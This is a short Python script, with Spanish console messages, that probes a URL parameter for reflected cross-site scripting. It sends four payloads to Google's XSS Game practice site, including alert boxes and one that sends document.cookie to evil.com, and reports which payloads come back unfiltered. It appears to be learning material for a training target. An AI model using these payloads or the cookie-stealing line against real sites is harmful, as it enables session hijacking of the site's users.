import requests
import urllib.parse
import webbrowser

def test_xss(url, parametro="q"):
    payloads = [
        "<script>alert('HELLO BUDDY')</script>",
        "<script>console.log(document.cookie)</script>",
        "<img src='x' onerror='alert(1)'>",
        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
    ]
    
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?{parametro}={encoded_payload}"
        print(f"\nProbando URL: {test_url}")
        
        try:
            res = requests.get(url, params={parametro: payload})
            if payload in res.text:
                print(f'XSS posible con: {payload}')
                if input("¿Abrir en navegador? (s/n): ").lower() == 's':
                    webbrowser.open(test_url)
            else:
                print('Payload bloqueado')
        except requests.exceptions.RequestException as e:
            print(f'Error: {e}')

test_xss("https://xss-game.appspot.com/level1/frame", "query")